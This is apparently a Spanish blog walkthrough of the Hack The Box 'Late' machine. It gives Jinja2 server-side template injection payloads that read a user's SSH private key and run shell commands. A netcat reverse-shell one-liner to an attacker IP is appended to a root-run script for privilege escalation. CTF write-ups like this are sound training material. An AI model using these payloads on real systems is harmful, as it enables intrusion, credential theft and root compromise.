---
layout: post
author: Sergio Salgado
---

## [](#header-2)Indice
Esta maquina es una de las sencillas en HtB. Aunque si batalle mucho a la hora del SSTI, tuve que investigar demasiado a fondo sobre esta vulnerabilidad, pero al final persistiendo en el intento lo logre.

## [](#header-2)<a href="#desarrollo">Desarrollo</a>
Despues del tipico escaneo con nmap, vimos que solamente teniamos abiertos los puertos 22 de ssh y 80 del servicio tcp, que correspondia a una pagina web. 
Navegando dentro del codigo de la pagina, encontramos un enlace a convertir tus propias imagenes con texto a texto e icimos la prueba para conocer mas sobre el motor al que le correspondia al procesador de flsk. Con la siguiente cadena:
```py
{% raw %}
{{%7*7%}}
${7*7}
<%=7*7%> 
${{%7*7%}} 
#{7*7}
{% endraw %}
```

Solamente tenemos que anotarlo en un bloc de notas y tomarle una captura de pantalla, para despues subirlo en el images.Late.htb. Lo que nos daba como resultado en un result.txt, era una compilacion de codigo. El cual representaba una vulnerabilidad en SSTI. La cual viene a gran profundidad en <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">mi pagina favorita</a> y resulta que el motor que esta usando flask es jinja2. Batalle mucho a la hora de tomar las capturas de pantalla, recortar la imagen o simplemente encontrar las variables que se encontraban dentro del programa. El blog que estaba siguiendo no explicaba con claridad el comando que utilizo para llegar a los siguientes pasos, pero me tome la tarea de corregir errores agregando guines bajos '_' en las partes que no reconocia el script que subia. Los ejemplos de las imagenes que llegue a usar son:


Para poder ejecutar comandos de cmd:

![Os cmd](/assets/images/late/os_cmd_request.png)

Para solicitar la flag de usuraio:

![User flag](/assets/images/late/flag_request.png)

Respuesta de la captura anterior:

![Flag result](/assets/images/late/flag_txt.png)

Como en otras maquinas, podremos entrar con el usuario a traves del servicio de ssh, solamente tendremos que copiarnos el /home/svc_acc/id_rsa ya que es posible leerlo desde el servicio de jinja.
Podemos usar el script siguiente:
```py
{% raw %}
{{% get_flashed_messages.__globals__.__builtins___.open("/home/svc_acc/.ssh/id_rsa").read() %}}
{% endraw %}
```

Aqui presente problemas al generar el archivo `authorized_keys` por que como no se muestra en el resultado la correcta ejecusion del comando, tuve que ejecutarlo varias veces. Recomiendo que en el script que se utilice, contenga algo parecido a:

```py
{% raw %}
{{% get_flashed_messages.__globals__.__builtins___.__import__("os")["popen"]("cp /home/svc_acc/.ssh/id_rsa /home/svc_acc/.ssh/authorized_keys").read() %}}

{{% get_flashed_messages.__globals__.__builtins___.__import__("os")["popen"]("chmod 666 /home/svc_acc/.ssh/authorized_keys").read() %}}

{{% get_flashed_messages.__globals__.__builtins___.__import__("os")["popen"]("ls").read() %}}
{% endraw %}
```

Con esto, no podremos ejecutar `ls -l` para ver que los permisos se hayan aplicado, pero al menos podremos ver que el archivo ha sido copiado.

Una vez teniendo la shell, y ejecutar el LinePeas, nos fuimos por lo mas sencillo para escalar privilegios que era en el archivo /usr/local/sbin/ssh-alert.sh que probablemente esta corriendo en todo momento, se puede utilizar pspy para echar un vistaso para ver que esta ocurriendo. La herramienta actualizada se encuentra en <a href="https://github.com/DominicBreuker/pspy">GIT</a> y observaremos con esta herramienta que el servicio lo esta utilizando el usuario con el UID=0, el cual es el perteneciente a root. Asi que procederemos a editar el archivo e inyectarle un script sencillo.

Para inyectar el codigo, primero hay que crear el archivo /tmp/append.txt, el cual dentro tendra:

```s
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.230 4444 >/tmp/f
```

y a continuacion solamente tendremos que ejecutar el comando:

```s
cat /tmp/append.txt >> /usr/local/sbin/ssh-alert.sh
```

Hacemos un append de lo anterior en el archivo ssh-alert.sh, preparamos el reverse shell para capturarlo desde nuestra kali como normalmente lo hacemos con el nc -nlvp 4444, y finalmente obtenemos otra shell con un nuevo usuario que esta vez sera root. Para que se ejecute, bastara con cerrar la sesion con ssh que teniamos e inmediatamente iniciara la coneccion con netcat desde nuestra kali.

![User flag](/assets/images/late/root_access.png)

![Late powned](/assets/images/late/Late_pwnd.png)
